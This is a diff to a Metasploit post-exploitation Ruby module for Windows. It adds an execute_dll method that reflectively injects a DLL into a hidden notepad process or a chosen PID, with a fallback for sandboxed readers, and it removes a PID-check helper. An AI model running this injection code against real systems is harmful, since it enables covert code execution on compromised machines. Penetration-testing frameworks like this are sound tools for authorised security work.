@@ -9,7 +9,14 @@ module Process
 
   include Msf::Post::Windows::ReflectiveDLLInjection
 
-  # Checks the Architeture of a Payload and PID are compatible
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Compat' => { 'Meterpreter' => { 'Commands' => %w{ core_channel_* stdapi_sys_process_* } } }
+    ))
+  end
+
+  # Checks the architecture of a payload and PID are compatible
   # Returns true if they are false if they are not
   def arch_check(test_arch, pid)
     # get the pid arch
@@ -36,11 +43,55 @@ module Process
   end
 
   #
+  # Injects a reflective DLL in to a process, and executes it.
+  #
+  # @param rdll_path [String] The path to the DLL to inject
+  # @param param     [String, Integer, nil] The parameter to pass to the DLL's entry point. If this value is a String
+  #   then it will first be written into the process memory and then passed by reference. If the value is an Integer,
+  #   then the value will be passed as is. If the value is nil, it'll be passed as a NULL pointer.
+  # @param pid       [Integer] The process ID to inject to, if unspecified, a new instance of notepad.exe will be
+  #   launched to host the injected DLL.
+  def execute_dll(rdll_path, param=nil, pid=nil)
+    if pid.nil?
+      print_status('Launching notepad to host the DLL...')
+      notepad_process = client.sys.process.execute('notepad.exe', nil, { 'Hidden' => true })
+      begin
+        process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
+        print_good("Process #{process.pid} launched.")
+      rescue Rex::Post::Meterpreter::RequestError
+        # Reader Sandbox won't allow to create a new process:
+        # stdapi_sys_process_execute: Operation failed: Access is denied.
+        print_error('Operation failed. Trying to inject into the current process...')
+        process = client.sys.process.open
+      end
+    else
+      process = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
+    end
+
+    print_status("Reflectively injecting the DLL into #{process.pid}...")
+    exploit_mem, offset = inject_dll_into_process(process, ::File.expand_path(rdll_path))
+
+    if param.is_a?(String)
+      # if it's a string, treat it as data and copy it into the remote process then pass it by reference
+      param_ptr = inject_into_process(process, param)
+    elsif param.is_a?(Integer)
+      param_ptr = param
+    elsif param.nil?
+      param_ptr = 0
+    else
+      raise TypeError, 'param must be a string, integer or nil'
+    end
+
+    process.thread.create(exploit_mem + offset, param_ptr)
+    nil
+  end
+
+  #
   # Injects shellcode to a process, and executes it.
   #
   # @param shellcode [String] The shellcode to execute
   # @param base_addr [Integer] The base address to allocate memory
-  # @param pid       [Integer] The process ID to inject to
+  # @param pid       [Integer] The process ID to inject to, if unspecified, the shellcode will be executed in place.
   #
   # @return [Boolean] True if successful, otherwise false
   #
@@ -83,25 +134,6 @@ module Process
     Rex.sleep(delay_sec)
   end
 
-  # Determines if a PID actually exists
-  def has_pid?(pid)
-    procs = []
-    begin
-      procs = client.sys.process.processes
-    rescue Rex::Post::Meterpreter::RequestError
-      print_error("Unable to enumerate processes")
-      return false
-    end
-
-    procs.each do |p|
-      found_pid = p['pid']
-      return true if found_pid == pid
-    end
-
-    print_error("PID #{pid.to_s} does not actually exist.")
-
-    return false
-  end
 end # Process
 end # Windows
 end # Post
